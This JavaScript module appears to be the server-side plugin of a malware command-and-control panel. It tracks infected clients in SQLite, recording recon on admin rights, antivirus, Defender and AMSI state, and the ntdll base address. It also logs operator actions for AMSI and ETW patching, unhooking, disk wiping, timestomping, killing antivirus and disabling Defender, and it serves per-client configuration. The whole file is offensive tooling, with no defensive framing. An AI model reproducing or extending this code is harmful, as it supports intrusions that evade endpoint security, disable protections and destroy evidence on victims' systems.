function norm(payload) {
  if (payload == null) return {};
  if (typeof payload === "string") {
    try { return JSON.parse(payload); } catch { return { raw: payload }; }
  }
  if (payload instanceof Uint8Array || payload instanceof ArrayBuffer) {
    const s = new TextDecoder().decode(payload);
    try { return JSON.parse(s); } catch { return { raw: s }; }
  }
  return payload;
}

export default {
  setup(ctx) {
    ctx.clients = new Map();

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS recon (
        client_id TEXT PRIMARY KEY,
        admin INTEGER,
        av TEXT,
        defender TEXT,
        amsi INTEGER,
        ntdll TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS actions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        kind TEXT,
        ok INTEGER,
        detail TEXT,
        seen_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS ev_actions ON actions(client_id)`);

    ctx.db.run(`CREATE TABLE IF NOT EXISTS config (client_id TEXT PRIMARY KEY, config TEXT NOT NULL)`);
  },

  onEvent(ctx, clientId, event, payload) {
    if (!clientId) return;
    ctx.clients.set(clientId, Date.now());
    const p = norm(payload);
    const now = Date.now();

    if (event === "recon") {
      ctx.db.run(
        `INSERT INTO recon (client_id, admin, av, defender, amsi, ntdll, seen_at)
         VALUES (?, ?, ?, ?, ?, ?, ?)
         ON CONFLICT(client_id) DO UPDATE SET
           admin = excluded.admin, av = excluded.av, defender = excluded.defender,
           amsi = excluded.amsi, ntdll = excluded.ntdll, seen_at = excluded.seen_at`,
        clientId, p.admin ? 1 : 0, JSON.stringify(p.av || []),
        typeof p.defender === "string" ? p.defender : JSON.stringify(p.defender || {}),
        p.amsiLoaded ? 1 : 0, p.ntdllBase || null, now
      );
      ctx.broadcast("recon", { clientId, ...p });
    } else if (event === "amsi" || event === "etw" || event === "unhook") {
      const ok = !!(p.patched || p.ok);
      ctx.db.run(
        `INSERT INTO actions (client_id, kind, ok, detail, seen_at) VALUES (?, ?, ?, ?, ?)`,
        clientId, event, ok ? 1 : 0,
        p.reason || (p.addr ? `${p.addr} @ ${p.base || ""}` : null), now
      );
      ctx.broadcast(event, { clientId, ...p });
    } else if (event === "wipe" || event === "timestomp" || event === "killav" || event === "defender") {
      ctx.db.run(
        `INSERT INTO actions (client_id, kind, ok, detail, seen_at) VALUES (?, ?, 1, ?, ?)`,
        clientId, event, JSON.stringify(p), now
      );
      ctx.broadcast(event, { clientId, ...p });
    } else if (event === "status") {
      ctx.broadcast("status", { clientId, ...p });
    } else if (event === "error") {
      ctx.broadcast("error", { clientId, ...p });
    } else if (event === "pong") {
      ctx.broadcast("pong", { clientId, ...p });
    }
  },

  rpc: {
    list_clients(ctx) {
      return Array.from(ctx.clients.entries()).map(([clientId, lastSeen]) => ({ clientId, lastSeen }));
    },

    get_config(ctx, params = {}) {
      const row = ctx.db.query(`SELECT config FROM config WHERE client_id = ?`).get(params.clientId || "");
      return row ? JSON.parse(row.config) : {};
    },

    save_config(ctx, params = {}) {
      ctx.db.run(
        `INSERT INTO config (client_id, config) VALUES (?, ?)
         ON CONFLICT(client_id) DO UPDATE SET config = excluded.config`,
        params.clientId, JSON.stringify(params.config || {})
      );
      return { ok: true };
    },

    get_recon(ctx, params = {}) {
      const row = ctx.db.query(`SELECT * FROM recon WHERE client_id = ?`).get(params.clientId || "");
      if (!row) return null;
      return {
        admin: !!row.admin,
        av: JSON.parse(row.av || "[]"),
        defender: row.defender,
        amsiLoaded: !!row.amsi,
        ntdllBase: row.ntdll,
        at: row.seen_at,
      };
    },

    list_actions(ctx, params = {}) {
      return ctx.db
        .query(`SELECT kind, ok, detail, seen_at AS at FROM actions
                WHERE client_id = ? ORDER BY id DESC LIMIT 100`)
        .all(params.clientId || "")
        .map((r) => ({ ...r, ok: !!r.ok }));
    },
  },
};
